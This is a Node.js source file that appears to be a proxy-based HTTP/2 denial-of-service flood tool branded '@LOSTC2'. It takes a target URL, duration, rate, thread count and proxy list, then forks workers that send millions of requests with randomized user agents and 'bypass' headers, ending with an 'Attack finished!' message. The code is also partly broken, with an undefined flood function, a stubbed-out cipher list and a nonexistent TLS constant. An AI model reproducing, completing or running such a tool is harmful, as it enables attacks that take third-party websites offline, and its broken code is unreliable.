const net = require("net");
const http2 = require("http2")
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const UserAgent = require('user-agents');
const fs = require("fs");
const http = require("http");
const { performance } = require("perf_hooks");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

const DEFAULT_USER_AGENT = new UserAgent().toString();
const HTTP_REQUEST_HEADERS = {
    ":method": "GET",
    ":scheme": "https",
    "accept": "/",
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate",
    "cache-control": "no-cache",
    "upgrade-insecure-requests": "1"
};

const HTTP_REQUEST_TIMEOUT = 5000; // Set your desired timeout in milliseconds
const SLOW_RESPONSE_THRESHOLD = 2000; // Set your desired threshold for slow responses in milliseconds

const TARGET_REQUESTS = 30000000; // Set your desired total number of requests

if (process.argv.length < 7) {
    console.log(`[ URL ] [ TIME ] [ RPS ] [ THREAD ] [ PROXY ] @LOSTC2`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);

class NetSocket {
    constructor() {}

    static HTTP(options, callback) {
        const req = http.request(options, (res) => {
            const startTimestamp = Date.now();

            res.on('data', () => { /* Consume response data if needed */ });

            res.on('end', () => {
                const responseTime = Date.now() - startTimestamp;
                if (responseTime > SLOW_RESPONSE_THRESHOLD) {
                    console.warn('Slow response detected:', responseTime, 'ms');
                }

                callback(null);
            });
        });

        req.on('error', (error) => {
            callback(error);
        });

        // Set request timeout
        req.setTimeout(HTTP_REQUEST_TIMEOUT, () => {
            req.abort(); // Abort the request on timeout
        });

        req.end();
    }
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function calculateRequests(t) {
    const totalTimeInSeconds = args.time;
    const totalRequests = TARGET_REQUESTS;
    const requestsPerSecond = totalRequests / totalTimeInSeconds;

    const amplitude = 0.5;
    const frequency = 0.1;
    const sineValue = Math.sin(2 * Math.PI * frequency * t);
    return Math.floor(requestsPerSecond * (1 + amplitude * sineValue));
}

function createProxyOptions(proxyAddr) {
    const parsedProxy = proxyAddr.split(":");
    return {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: args.target + ":443",
        timeout: 3
    };
}

function createTLSOptions() {
    const cplist = [
        // ... (existing cipher list)
    ];
    const cipper = cplist[Math.floor(Math.random() * cplist.length)];

    return {
        ALPNProtocols: ['h2', 'http/1.1', 'h3', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'],
        ciphers: cipper,
        servername: url.hostname,
        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
        secure: true,
        rejectUnauthorized: false,
    };
}

function createHTTP2Client(tlsConn, parsedTarget) {
    const client = http2.connect(parsedTarget.href, {
        createConnection: () => tlsConn,
    });

    client.on("connect", () => {
        const IntervalAttack = setInterval(() => {
            const requests = calculateRequests(performance.now() / 1000);

            for (let i = 0; i < requests; i++) {
                const request = client.request(HTTP_REQUEST_HEADERS)
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return;
                    });

                request.end();
            }
        }, 1000);
    });

    client.on("close", () => {
        client.destroy();
        tlsConn.destroy();
        return;
    });

    client.on("error", error => {
        client.destroy();
        tlsConn.destroy();
        return;
    });
}

function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function createHttpRequestWithCrypto(options, cryptoString, callback) {
    const req = http2.request(options, (res) => {
        res.on('data', () => { /* Consume response data if needed */ });
        res.on('end', () => {
            callback(null);
        });
    });

    req.on('error', (error) => {
        callback(error);
    });

    req.write(cryptoString);
    req.end();
}

function runHttpCrypto() {
    const target = url.parse(args.target);
    const cryptoString = generateRandomString(32);
    const requests = calculateRequests(performance.now() / 1000);

    for (let i = 0; i < requests; i++) {
        const httpOptions = {
            ...target,
            method: 'POST', // or 'GET' based on your requirement
            headers: {
                ...HTTP_REQUEST_HEADERS,
                'user-agent': DEFAULT_USER_AGENT,
                'content-type': 'text/plain',
            },
        };

        createHttpRequestWithCrypto(httpOptions, cryptoString, (error) => {
            if (error) {
                console.error('Error making HTTP request with crypto:', error.message);
            }
            // Optionally, you can log successful requests or handle errors.
        });
    }
}

function createBypassedHttpRequest(options, callback) {
    // Add your custom headers or modifications to the options object here
    options.headers['custom-header'] = 'bypass-header';
    
    const req = http2.request(options, (res) => {
        res.on('data', () => { /* Consume response data if needed */ });
        res.on('end', () => {
            callback(null);
        });
    });

    req.on('error', (error) => {
        callback(error);
    });

    req.end();
}

function runHttpBypass() {
    const target = url.parse(args.target);
    const requests = calculateRequests(performance.now() / 1000);

    for (let i = 0; i < requests; i++) {
        const httpOptions = {
            ...target,
            method: 'GET', // or 'POST' based on your requirement
            headers: {
                ...HTTP_REQUEST_HEADERS,
                'user-agent': DEFAULT_USER_AGENT,
            },
        };

        createBypassedHttpRequest(httpOptions, (error) => {
            if (error) {
                console.error('Error making bypassed HTTP request:', error.message);
            }
            // Optionally, you can log successful requests or handle errors.
        });
    }
}

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(() => {
        runHttpFlood();
        // ... (other attack functions)
    }, 1000);
}

const Kill = setInterval(() => {
    const T1 = performance.now();
    if ((T1 - 10) >= args.time * 1000) {
        clearInterval(Kill);
        console.log("\x1b[1m\x1b[31m[+] Attack finished!\x1b[37m");
        process.exit();
    }
}, 10);
